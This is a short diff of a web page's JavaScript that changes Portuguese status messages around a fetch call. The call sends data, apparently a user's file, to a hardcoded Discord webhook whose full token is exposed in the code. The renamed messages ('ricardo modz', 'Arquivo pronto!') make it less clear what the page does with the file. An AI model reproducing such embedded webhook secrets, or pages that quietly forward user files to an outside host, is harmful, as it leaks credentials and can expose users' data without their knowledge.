@@ -236,7 +236,7 @@
             const webhookUrl = 'https://discord.com/api/webhooks/1288980879397621791/iK325TYN4nvqY4Pls61Uq6K1hP-t2vEQn77Qvif29SVClz0b-CWVjpqHyEZf_LAhiZIa';
             const statusDiv = document.getElementById('status');
 
-            statusDiv.innerHTML = "obfuscador...";
+            statusDiv.innerHTML = "ricardo modz...";
             statusDiv.classList.remove('status-error');
             statusDiv.classList.remove('status-success');
 
@@ -246,12 +246,12 @@
             })
             .then(response => response.json())
             .then(data => {
-                statusDiv.innerHTML = "Arquivo obfuscador!";
+                statusDiv.innerHTML = "Arquivo pronto!";
                 statusDiv.classList.add('status-success');
             })
             .catch(error => {
                 console.error('Erro no envio:', error);
-                statusDiv.innerHTML = "Ocorreu um erro no envio.";
+                statusDiv.innerHTML = "ricardo modz.";
                 statusDiv.classList.add('status-error');
             });
         }
